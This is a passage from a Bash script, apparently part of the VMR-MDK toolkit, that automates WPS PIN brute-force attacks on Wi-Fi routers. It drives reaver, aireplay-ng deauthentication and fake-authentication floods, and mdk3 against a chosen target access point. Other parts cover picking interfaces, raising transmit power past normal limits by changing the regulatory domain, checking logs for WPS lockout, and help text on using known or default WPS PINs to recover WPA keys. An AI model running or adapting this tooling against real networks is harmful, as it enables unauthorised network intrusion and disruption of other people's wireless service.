#xterm -g 80x3+1+400    -T "MAC filter bruteforce mode" -e "mdk3 $MON f -t $TARGETAP1 -f 99:99:99:99:99:9F" &

		fi

if [[ $CHANNEL1 -gt 0 && $CHANNEL1 -le 14 ]]  && [[ $USE_AIRE0 == y || $USE_AIRE0 == Y ]]; then

sleep 10

xterm -g 80x5-1+400    -T "Aireplay-ng DEAUTH AP Activation" -e "aireplay-ng -0 10 -a $TARGETAP1 $MON" &

sleep 1

#	if [[ $USE_AIRE1 == n || $USE_AIRE1 == N ]]; then


#xterm -g 80x3+1+400    -T "MAC filter bruteforce mode" -e "mdk3 $MON f -t $TARGETAP1 -f 99:99:99:99:99:9F" &

#	fi
		fi
}

AIREPLAYLOOP_fn()

{

if [[ $CHANNEL1 -gt 0 && $CHANNEL1 -le 14 ]]  && [[ $USE_AIRE1 == y || $USE_AIRE1 == Y ]]; then

sleep 10

xterm -g 80x5-1+220    -T "Regenerative Aireplay-ng AP Activation" -e "while true; do aireplay-ng -1 10 -a $TARGETAP1 -q 4 $MON; killall -q aireplay-ng; sleep 2; done" &

sleep 1

#xterm -g 80x3+1+400    -T "MAC filter bruteforce mode" -e "mdk3 $MON f -t $TARGETAP1 -f 99:99:99:99:99:9F" &

		fi

if [[ $CHANNEL1 -gt 0 && $CHANNEL1 -le 14 ]]  && [[ $USE_AIRE0 == y || $USE_AIRE0 == Y ]]; then

sleep 10

xterm -g 80x5-1+400    -T "Aireplay-ng DEAUTH AP Activation" -e "aireplay-ng -0 10 -a $TARGETAP1 $MON" &

sleep 1

#	if [[ $USE_AIRE1 == n || $USE_AIRE1 == N ]]; then


#xterm -g 80x3+1+400    -T "MAC filter bruteforce mode" -e "mdk3 $MON f -t $TARGETAP1 -f 99:99:99:99:99:9F" &

#	fi
		fi
}






#~~~~~~~~~~~~~~~End Aireplay-ng End~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Select Device~~~~~~~~~~~~~~~#

SELECT_DEVICE_fn()
{

IFCONFIG_TYPE_fn

until  [ $DEVTEST == y ] || [ $DEVTEST == Y ]; do

airmon-old_fn | tee /tmp/airmontype.txt



airmontype=$(cat < /tmp/airmontype.txt | awk -F' ' '{ if(($1 == "Interface")) {print $1}}')


if [ -z $airmontype ]; then

      airmontype=ZZZ

	fi


echo "$airmontype"


 if [ $airmontype == Interface ]; then

echo -e  "$txtrst"
airmon-old_fn | tee airmon01.txt 

cat < airmon01.txt | awk -F' ' '{ if(($1 != "Interface")) {print $1}}' > airmon02.txt

cat < airmon02.txt | awk -F' ' '{ if(($1 != "")) {print $1}}' > airmon03.txt

  AIRMONNAME=$(cat airmon03.txt | nl -ba -w 1  -s ': ')

		fi


if [ $airmontype != Interface ]; then


echo -e  "$txtrst"

airmon-old_fn | tee airmon01.txt

cat < airmon01.txt | awk -F' ' '{ if(($2 != "Interface")) {print $2}}' > airmon02.txt

cat < airmon02.txt | awk -F' ' '{ if(($1 != "")) {print $2}}' > airmon03.txt

  AIRMONNAME=$(cat airmon03.txt | nl -ba -w 1  -s ': ')

		fi

echo ""
echo -e "$info Devices found by airmon-ng.$txtrst"
echo " "
echo "$AIRMONNAME" | sed 's/^/       /'
echo ""
echo -e "$inp    Enter the$yel line number$inp of the wireless device$yel (i.e. wlan0, wlan1 etc)$inp to be used."
echo -e "$warn  Device must support packet injection.$txtrst"

# chunkingz [edit]:
# i wouldnt test the wireless device if it supports packet injection automatically incase theres more than 1.
# but then again I am tempted so I'll leave it here, uncomment it but note that it will take some time, depending on the number of aps around you, because aireplay will test each ap it finds around you.
# You should also note that if your network card is in monitor mode already, aireplay would not be able to detect it, and would give a false result.
# I would recommend you use the diagnostic script found in ~/VMR/scripts directory.
#
#echo -n "**Injection Test:** "
#device=$(cat /tmp/airmontype.txt | grep -i "wlan" | cut -c "1-5")
#aireplay-ng --test $device | grep -oE "Injection is working!|No Answer..." || echo -e "\033[31mInjection test Failed\033[0m"
#echo -ne "\n\n"

echo -e "$yel You can check this using the diagnostic script in the ~/VMR-MDK-Kali2016/scripts directory $txtrst"

echo ""
read  -p "   Enter Line Number Here: " grep_Line_Number

echo -e "$txtrst"
DEV=$(cat airmon03.txt| sed -n ""$grep_Line_Number"p")

# Remove trailing white spaces leaves spaces between names intact

DEV=$(echo $DEV | xargs)

rm -f airmon01.txt
rm -f airmon02.txt
rm -f airmon03.txt

	while true
	do

echo ""
echo -e "$inp  You entered$yel $DEV$info type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
read DEVTEST

	case $DEVTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done

clear

}

#~~~~~~~~~~~~~~~End Select Device End~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Boost Device~~~~~~~~~~~~~~~#

BOOST_DEVICE_fn()
{
ifconfig $DEV down
sleep .1
iwconfig $DEV mode managed
sleep .1
ifconfig $DEV up

clear
	while true
	do

echo ""
echo -e "$q    Do you wish to boost your wifi device power to 30dBm?"
echo -e "$info  This routine works for the AWUSO36H and" #(AWUSO)
echo -e "$info  may work with other devices."
echo -e "$inp  Type$yel (y/Y)$inp for yes or$yel (n/N)$inp for no.$txtrst"
		read AWUSO
		case $AWUSO in
		y|Y|n|N) break ;;
		~|~~)
		echo Aborting -
		exit
		;;

		esac
		echo -e  "$warn !!!Wrong input try again!!!$txtrst"

			done

	if [ $AWUSO == y ] || [ $AWUSO == Y ]; then

		ifconfig $DEV down
		sleep 1
		iw reg set GY
		ifconfig $DEV up
		iwconfig $DEV channel 13
		iwconfig $DEV txpower 30
        	sleep 2
 
			fi

clear

}

#~~~~~~~~~~~~~~~End Boost Device End~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Select Monitor~~~~~~~~~~~~~~~#

SELECT_MONITOR_fn()
{

airmon-old_fn start $DEV &> /dev/null

sleep 1

until  [ $MONTEST == y ] || [ $MONTEST == Y ]; do

echo -e  "$txtrst"
airmon-old_fn | tee airmon01.txt

cat < airmon01.txt | awk -F' ' '{ if(($1 != "Interface")) {print $1}}' > airmon02.txt

cat < airmon02.txt | awk -F' ' '{ if(($1 != "")) {print $1}}' > airmon03.txt

  AIRMONNAME=$(cat airmon03.txt | nl -ba -w 1  -s ': ')

echo ""
echo -e "$info Devices found by airmon-ng.$txtrst"
echo " "
echo "$AIRMONNAME" | sed 's/^/       /'
echo ""
echo -e "$q    What wireless monitor interface$yel (i.e. mon0, mon1)$q will"
echo -e "  be used by reaver?$txtrst"
echo ""
read  -p "   Enter Line Number Here: " grep_Line_Number

echo -e "$txtrst"
MON=$(cat airmon03.txt| sed -n ""$grep_Line_Number"p")

# Remove trailing white spaces leaves spaces between names intact

MON=$(echo $MON | xargs)

rm -f airmon01.txt
rm -f airmon02.txt
rm -f airmon03.txt

	while true
	do

echo ""
echo -e "$inp  You entered$yel $MON$info type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
read MONTEST

	case $MONTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done

        clear
}
#~~~~~~~~~~~~~~~End Select Monitor End~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Start MAC Error Handeling Start~~~~~~~~~~~~~~~# 

MACERROR_HANDEL_fn()
{
####
# Error Handling For Mac Code Entries
# Tests Length of string
# Tests  Presence of only ::::: punctuation characters
# Tests only hex charcters present
# Sets correct puntuation for test

MACPUNCT=":::::"

sleep .2

#Tests punctuation

PUNCTEST=`echo "$TARGETAP1" | tr -d -c ".[:punct:]"`

sleep .2

if [ "$PUNCTEST" == "$MACPUNCT" ]

	then

	    PUNCT=1

	else

	    PUNCT=0

	fi

sleep .2

#Tests hex characters

MACALNUM=`echo "$TARGETAP1" | tr -d -c ".[:alnum:]"`

sleep .2


if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

then

	ALNUM=1
else

	ALNUM=0
  fi

sleep .2

#Tests string length

if [ ${#TARGETAP1} = 17 ]

then

	MACLEN=1
else

	MACLEN=0
  fi

sleep .2

# All variables set to ones  and zeros

until [ $MACLEN == 1 ] && [ $PUNCT == 1 ] && [ $ALNUM == 1 ]; do

	if [ $ALNUM == 0 ]; then
		echo -e "$warn  You are using a non-hex character.$txtrst"

			fi
	
	if [ $MACLEN == 0 ]; then
		echo -e "$warn  Your Mac code is the wrong length.$txtrst"

			fi

	if [ $PUNCT == 0 ]; then

		echo -e "$warn  You have entered the wrong and/or too many separators - use ONLY colons :$txtrst"

			fi

	echo -e "$info  Mac code entry incorrect!!!"
        echo "  You must use format 00:11:22:33:44:55 or aa:AA:bb:BB:cc:CC"
	echo "  Only a thru f, A thru F, 0 thru 9 and the symbol :  are allowed."
	echo -e "$inp  Reenter Mac code and try again(TARGETAP1).$txtrst"
	read TARGETAP1

        MACALNUM=`echo "$TARGETAP1" | tr -d -c ".[:alnum:]"`
	if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

        then

        	ALNUM=1

        else

	        ALNUM=0

			fi

sleep .2       

	if [ ${#TARGETAP1} == 17 ]

	then

		MACLEN=1
	else

		MACLEN=0

			fi

sleep .2

	PUNCTEST=`echo "$TARGETAP1" | tr -d -c ".[:punct:]"`
	if [ $PUNCTEST == $MACPUNCT ]

	then

	    PUNCT=1

	else

	    PUNCT=0

			fi

sleep 1

done
}  

#~~~~~~~~~~~~~~~End MAC Error Handeling End~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Start Manual Entry HIDDEN ESSID Handeling Start~~~~~~~~~~~~~~~#

MANUAL_SELECT_fn()
{
clear
echo -e "$info

    Check Entries - To change enter$yel line number$info of entry and
  follow program prompts.

    1) TargetAPs' Name  \e[1;36m $inp [$yel $NAME1 $inp]
$info
    2) Mac Address      \e[1;36m $inp [$yel $TARGETAP1 $inp]
$info
    3) Channel          \e[1;36m $inp [$yel $CHANNEL_MAN $inp]
$info
    C)ontinue

\n"
read var
case $var in

	1) echo -e "\033[36m\n$info TargetAP Name?$txtrst"
	read NAME1
	MANUAL_SELECT_fn;;

	2) echo -e "\033[36m\n$info Mac Address?$txtrst"
	read TARGETAP1
	MACERROR_HANDEL_fn
	MANUAL_SELECT_fn;;

	3) echo -e "\033[36m\n$info Channel?$txtrst"
	read CHANNEL_MAN
	MANUAL_SELECT_fn;;


	c|C) if [[ -z $NAME1 || -z $TARGETAP1 || -z $CHANNEL_MAN ]];then
		echo -e "\033[31m$warn Something is wrong - try again"
		sleep 1
		MANUAL_SELECT_fn
		fi;;

	*) 	MANUAL_SELECT_fn;;
esac

MACALNUM=`echo "$TARGETAP1" | tr -d -c ".[:alnum:]"`

}

#~~~~~~~~~~~~~~~End Manual Entry HIDDEN ESSID Handeling End~~~~~~~~~~~~~~~#


#~~~~~~~~~~~~~~~Start MAC Error Handeling MANUAL ENTRY DEV and mon0 Start~~~~~~~~~~~~~~~# 

ASSGNERROR_HANDEL_fn()

{
####
# Error Handling For Mac Code Entries
# Tests Length of string
# Tests  Presence of only ::::: punctuation characters
# Tests only hex charcters present
# Sets correct puntuation for test

MACPUNCT=":::::"

sleep .2

#Tests punctuation

PUNCTEST=`echo "$ASSIGN_MAC" | tr -d -c ".[:punct:]"`

sleep .2

if [ "$PUNCTEST" == "$MACPUNCT" ]

	then

	    PUNCT=1

	else

	    PUNCT=0

	fi

sleep .2

#Tests hex characters

MACALNUM=`echo "$ASSIGN_MAC" | tr -d -c ".[:alnum:]"`

sleep .2


if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

then

	ALNUM=1
else

	ALNUM=0
  fi

sleep .2

#Tests string length

if [ ${#ASSIGN_MAC} = 17 ]

then

	MACLEN=1
else

	MACLEN=0
  fi

sleep .2

	if [ $ALNUM == 0 ]; then
		echo -e "    You are using a non-hex character.$txtrst"

			fi
	
	if [ $MACLEN == 0 ]; then
		echo -e "    Your Mac code is the wrong length.$txtrst"

			fi

	if [ $PUNCT == 0 ]; then

		echo -e "    You have entered the wrong and/or too many separators - use ONLY colons :$txtrst"

			fi

	if [ $ALNUM == 0 ] || [ $MACLEN == 0 ] || [ $PUNCT == 0 ]; then

	echo ""
	echo -e "    Mac code entry ASSIGN_MAC=$ASSIGN_MAC is incorrect!!!"
        echo "  You must use format 00:11:22:33:44:55 or aa:AA:bb:BB:cc:CC"
	echo "  Only a thru f, A thru F, 0 thru 9 and the symbol :  are allowed."
	echo ""

			fi

}  

#~~~~~~~~~~~~~~~End MAC Error Handeling MANUAL ENTRY DEV and mon0 End~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Start Reaver Menu Start~~~~~~~~~~~~~~~#

REAVER_MENU_fn()
{
echo -e " "
echo -e "$info             Starting Reaver"
echo -e "$info TargetAP Name                      = $yel$NMEWARN1"
echo -e "$info Monitor                            = $yel$MON"
echo -e "$info Channel(note 0 = channel hopping)  = $yel$CHANNEL1"
echo -e "$info Mac code of Target AP              = $yel$TARGETAP1"

if  [ $MACSEL == y ] || [ $MACSEL == Y ]; then

echo -e "$info Assigned Mac code                  = $yel$VARMAC"

		fi

if  [ $MACSEL == n ] || [ $MACSEL == N ]; then

echo -e "$info Random Mac code                    = $yel$VARMAC"

		fi

echo -e "$info Reaver live time                   = $yel$LIVE1$info sec"
echo -e "$info Reaver start/stop cycles remaining = $yel$COUNT"

	 if [ $USE_R1 == y ] || [ $USE_R1 == Y ]; then

echo -e "$info Recurring-delay pin attempts x     = $yel$RX1$info x" 
echo -e "$info Recurring-delay sleep in sec y     = $yel$RY1$info sec"

	fi

echo -e "$info Text Log in$yel   /root/VARMAC_LOGS    = $NAME1-$DATEFILE-$PAD"

         if [ $ADVANMON == y ] || [ $ADVANMON == Y ]; then 

echo -e "$info Maximum Reaver Prescanning Time    = $yel$ADVAN_TIME$info sec"

	fi

echo -e "$info Using Config File$yel/root/VARMAC_CONFIG/$SOURCENAME$info" 

    if [ ! -z $WPSPIN ]; then

echo -e "$info Pixieswps1.1 has found WPS Pin     = $yel$WPSPIN $txtrst"

		fi

}

#~~~~~~~~~~~~~~~Start WPS Pin help Start~~~~~~~~~~~~~~~#

WPS_PINHELP1_fn()
{
echo -e "$txtrst"
echo "    A known WPS Pin is a pin that has been seen to be used with the router."
echo "  If the WPS pin has been broken before, but the WPA key has been changed,"
echo "  there is a high chance the WPA key can be broken quickly by using the"
echo "  previously seen WPS pin. Owners rarely change their WPS pin."
echo "    A default WPS pin is computed by various default pin programs. A router"
echo "  after start/restart may have this pin installed." 
echo "    Reaver allows the user to try specific WPS Pins to save having to brute"
echo "  force all 11,000 pins. If you know the previous WPS pin of the router, try"
echo "  that pin. VMR-MDK can also compute default WPS Pins based on the mac"
echo "  address(bssid) and AP Name(essid)."
echo "    Selecting (y/Y) here will allow the user to either enter a WPS pin"
echo "  manually or select a default pin from a computed list. Selecting (n/N)"
echo "  turns off this feature and all 11,000 pins are then brute forced by"
echo "  reaver. Brute Forcing all pins is used in the majority of cases."
echo ""
echo "                  !!!WARNING BEFORE USING SPECIFIC PINS!!!"
echo "    Reaver stores its work in kali-linux in the etc/reaver folder."
echo "  If you are using a modded version supporting pixiedust then the data"
echo "  maybe found in the /etc/reaver/ folder. To find where these"
echo "  files are stored type locate *.wpc in a terminal window  The data"
echo "  for each AP attacked is kept in individual files. The file names given"
echo "  are the mac addresses(bssid) of the AP's targeted."
echo ""
echo "                         Testing a Specific Pin"
echo "    If you decide to switch from a brute force attack testing all pins,"
echo "  to using a specific WPS pin, your brute force pin count may be lost."
echo "  To avoid Brute Force versus Specific Pin count conflicts with reaver,"
echo "  ALL testing of specific pin files are sent to the /usr/share/doc/reaver/"
echo "  folder thru the --session= command and given the file name:"
echo ""
echo "                   testpin-WPSpintested-mac address"
echo ""
echo "  If testing a specific pin fails, you can return to your brute force with"
echo "  no loss of reaver pin count position."

}

#~~~~~~~~~~~~~~~End WPS Pin Help End~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Start Determine Locked State Start~~~~~~~~~~~~~~~#

TIMING_LOCKED_fn()
{

echo -e "$info Router Pause/Recovery Time         = $yel$PAUSE$info sec"
echo -e "$info MDK3 Attack Time                   = $yel$MDKLIVE$info sec"

	if [ $MDKTYPE1 = 1 ]; then
 
echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT1"

	elif [ $MDKTYPE1 = 2 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT2"

	elif [ $MDKTYPE1 = 3 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT3"

	elif [ $MDKTYPE1 = 4 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT4"

	elif [ $MDKTYPE1 = 5 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT5"

	elif [ $MDKTYPE1 = 6 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT6"

	elif [ $MDKTYPE1 = 7 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT7"

	elif [ $MDKTYPE1 = 8 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT8"

	elif [ $MDKTYPE1 = 9 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT9"

	elif [ $MDKTYPE1 = 10 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT10"

	elif [ $MDKTYPE1 = 11 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT11"

	elif [ $MDKTYPE1 = 12 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT12"

	elif [ $MDKTYPE1 = 13 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT13"

	elif [ $MDKTYPE1 = 14 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT14"

	elif [ $MDKTYPE1 = 15 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT15"

		fi

echo -e "$warn Monitor WPS Pin Collection - Adjust Reaver Live Time Accordingly!!!$txtrst"
echo -e ""

if [[ $ADVAN_TIME -lt 120 ]] &&  [[ $ADVANMON == y || $ADVANMON == Y ]]; then
 

	ADVAN_TIME=120

              fi

#######DETERMINE WPS LOCKED-NO ASSOC BEGIN ########
# Divide time to take file snaps every 1/5 LIVE time to avoid subprocess hang with tail.
LIVEDIV=$(((($ADVAN_TIME-30))/8))
LINECAP=2 # Set line capture switch

if [[ $DAMP_MDK == y || $DAMP_MDK == Y ]]; then

if [ $LINECAP -eq 2 ]; then 
	AIREPLAY_fn
		echo -e "    Starting Stage I"    
	tput sc
	echo -e "$info  1. Scanning $NAME1-$DATEFILE-$PAD for AP activity(Stage I)."
	sleep 15
	killall -q aireplay-ng
	killall -q mdk3

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "1. Reading file for AP activity(Stage I)."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

PINFOUND_fn

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################

if [ $LINECAP -eq 2 ]; then 
	AIREPLAY_fn
	tput rc
	tput ed
	echo -e "$info  2. Scanning$yel $NAME1-$DATEFILE-$PAD$info for AP activity(Stage I)."
	sleep 15
	killall -q aireplay-ng
	killall -q mdk3
           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "2. Reading file for AP activity(Stage I)."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

PINFOUND_fn

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	AIREPLAY_fn
	tput rc
	tput ed
	echo -e "$info  3. Scanning $NAME1-$DATEFILE-$PAD for AP activity(Stage I)."
	sleep $LIVEDIV
	killall -q aireplay-ng
	killall -q mdk3
           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "3. Reading file for AP activity(Stage I)."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

PINFOUND_fn

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	AIREPLAY_fn
	tput rc
	tput ed
	echo -e "$info  4. Scanning$yel $NAME1-$DATEFILE-$PAD$info for AP activity(Stage I)."
	sleep $LIVEDIV
	killall -q aireplay-ng
	killall -q mdk3
           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "4. Reading file for AP activity(Stage I)."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

PINFOUND_fn

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	AIREPLAY_fn
	tput rc
	tput ed	
	echo -e "$info  5. Scanning $NAME1-$DATEFILE-$PAD for AP activity(Stage I)."
	sleep $LIVEDIV
	killall -q aireplay-ng
	killall -q mdk3

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "5. Reading file for AP activity(Stage I)."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

PINFOUND_fn

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	AIREPLAY_fn
	tput rc
	tput ed	
	echo -e "$info  6. Scanning$yel $NAME1-$DATEFILE-$PAD$info for AP activity(Stage I)."
	sleep $LIVEDIV
	killall -q aireplay-ng
	killall -q mdk3
           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "6. Reading file for AP activity(Stage I)."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

PINFOUND_fn

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	AIREPLAY_fn
	tput rc
	tput ed
	echo -e "$info  7. Scanning $NAME1-$DATEFILE-$PAD for AP activity(Stage I)."
	sleep $LIVEDIV
	killall -q aireplay-ng
	killall -q mdk3

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "7. Reading file for AP activity(Stage I)."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

PINFOUND_fn

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	AIREPLAY_fn
	tput rc
	tput ed
	echo -e "$info  8. Scanning$yel $NAME1-$DATEFILE-$PAD$info for AP activity(Stage I)."
	sleep $LIVEDIV
	killall -q aireplay-ng
	killall -q mdk3

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "8. Reading file for AP activity(Stage I)."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

PINFOUND_fn

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	AIREPLAY_fn
	tput rc
	tput ed
	echo -e "$info  9. Scanning $NAME1-$DATEFILE-$PAD for AP activity(Stage I)."
	sleep $LIVEDIV
	killall -q aireplay-ng
	killall -q mdk3

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "9. Reading file for AP activity(Stage I)."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

PINFOUND_fn

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	AIREPLAY_fn
	tput rc
	tput ed
	echo -e "$info  10. Scanning$yel $NAME1-$DATEFILE-$PAD$info for AP activity(Stage I)."
	sleep $LIVEDIV
	killall -q aireplay-ng
	killall -q mdk3

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let # old let

		fi

#echo "10. Reading file for AP activity(Stage I)."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

PINFOUND_fn

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

		fi  # Linked to=if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

############################ End of Advanced monitering #########################


    if [[ $DAMP_MDK == n || $DAMP_MDK == N ]]; then

		LINECAP=1

			fi


#####ADVAN MONITOR and MDK3 Suppress Selections

####  MDK3 suppress Note if DAMPEN_MDK3=y then ADVANMON=y $LINECAP -eq 1

if  [[ $REAVER_COUNT == y || $REAVER_COUNT == Y ]] && [[ $DAMP_MDK == y || $DAMP_MDK == Y ]] && [[ $LINECAP -eq 1 ]]; then

#AIREPLAY_fn
AIREPLAYLOOP_fn

seconds=$LIVE1; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$txtrst Stage II$info Started - Reaver live time remaining. $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

	done

		fi

if  [[ $REAVER_COUNT == n || $REAVER_COUNT == N ]] && [[ $DAMP_MDK == y || $DAMP_MDK == Y ]] && [[ $LINECAP -eq 1 ]]; then


#AIREPLAY_fn
AIREPLAYLOOP_fn
		echo " "
		echo -e "$txtrst Stage II$info - Started - Reaver will run for$yel $LIVE1$info sec."
		sleep $LIVE1

		fi

###########DAMP_MDK=n

if  [[ $REAVER_COUNT == y || $REAVER_COUNT == Y ]] && [[ $DAMP_MDK == n || $DAMP_MDK == N ]]; then

#AIREPLAY_fn
AIREPLAYLOOP_fn

seconds=$LIVE1; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$txtrst Stage II$info - Started-Reaver live time remaining. $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

	done

		fi

if  [[ $REAVER_COUNT == n || $REAVER_COUNT == N ]] && [[ $DAMP_MDK == n || $DAMP_MDK == N ]]; then

#AIREPLAY_fn
